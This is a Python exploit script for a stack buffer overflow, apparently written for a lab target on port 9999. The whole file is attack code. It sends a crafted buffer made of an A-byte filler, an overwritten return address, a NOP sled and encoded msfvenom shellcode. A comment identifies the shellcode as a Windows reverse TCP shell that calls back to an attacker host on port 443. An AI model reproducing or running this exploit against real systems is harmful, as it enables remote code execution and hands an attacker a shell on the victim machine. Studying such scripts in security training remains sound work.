#!/usr/bin/python
import socket
try:
    print "\nSending evil buffer..."
    # Per msf-pattern_offset, exact match at 524 bytes 
    filler = "\x41" * 524
    eip = "\x43\xd7\xec\x75"
    nops = "\x90" * 8
    #msfvenom -p windows/shell_reverse_tcp LHOST=172.16.50.3 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00"
    shell = (
        "\x52\x31\x53\x17\x03\x53\x17\x83\x88\xfa\x05\xaa\xb2\xeb\x48"
        "\x55\x4a\xec\x2c\xdf\xaf\xdd\x6c\xbb\xa4\x4e\x5d\xcf\xe8\x62"
        "\x16\x9d\x18\xf0\x5a\x0a\x2f\xb1\xd1\x6c\x1e\x42\x49\x4c\x01"
        "\xc0\x90\x81\xe1\xf9\x5a\xd4\xe0\x3e\x86\x15\xb0\x97\xcc\x88"
        "\x24\x93\x99\x10\xcf\xef\x0c\x11\x2c\xa7\x2f\x30\xe3\xb3\x69"
        "\x92\x02\x17\x02\x9b\x1c\x74\x2f\x55\x97\x4e\xdb\x64\x71\x9f"
        "\x24\xca\xbc\x2f\xd7\x12\xf9\x88\x08\x61\xf3\xea\xb5\x72\xc0"
        "\x91\x61\xf6\xd2\x32\xe1\xa0\x3e\xc2\x26\x36\xb5\xc8\x83\x3c"
        "\x91\xcc\x12\x90\xaa\xe9\x9f\x17\x7c\x78\xdb\x33\x58\x20\xbf"
        "\x5a\xf9\x8c\x6e\x62\x19\x6f\xce\xc6\x52\x82\x1b\x7b\x39\xcb"
        "\xe8\xb6\xc1\x0b\x67\xc0\xb2\x39\x28\x7a\x5c\x72\xa1\xa4\x9b"
        "\x75\x98\x11\x33\x88\x23\x62\x1a\x4f\x77\x32\x34\x66\xf8\xd9"
        "\xc4\x87\x2d\x4d\x94\x27\x9e\x2e\x44\x88\x4e\xc7\x8e\x07\xb0"
        "\xf7\xb1\xcd\xd9\x92\x48\x86\x49\x72\x60\x55\xfa\x71\x84\x58"
        "\x41\xfc\x62\x30\xa5\xa9\x3d\xad\x5c\xf0\xb5\x4c\xa0\x2e\xb0"
        "\x4f\x2a\xdd\x45\x01\xdb\xa8\x55\xf6\x2b\xe7\x07\x51\x33\xdd"
        "\x2f\x3d\xa6\xba\xaf\x48\xdb\x14\xf8\x1d\x2d\x6d\x6c\xb0\x14"
        "\xc7\x92\x49\xc0\x20\x16\x96\x31\xae\x97\x5b\x0d\x94\x87\xa5"
        "\x8e\x90\xf3\x79\xd9\x4e\xad\x3f\xb3\x20\x07\x96\x68\xeb\xcf"
        "\x6f\x43\x2c\x89\x6f\x8e\xda\x75\xc1\x67\x9b\x8a\xee\xef\x2b"
        "\xf3\x12\x90\xd4\x2e\x97\xa0\x9e\x72\xbe\x28\x47\xe7\x82\x34"
        "\x78\xd2\xc1\x40\xfb\xd6\xb9\xb6\xe3\x93\xbc\xf3\xa3\x48\xcd"
        "\x6c\x46\x6e\x62\x8c\x43"    
    )
    buffer = filler+eip+nops+shell

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("172.16.101.21",9999))
    s.send(buffer)

    s.close()

    print "\nDone!"
except:
    print "Could not connect!"

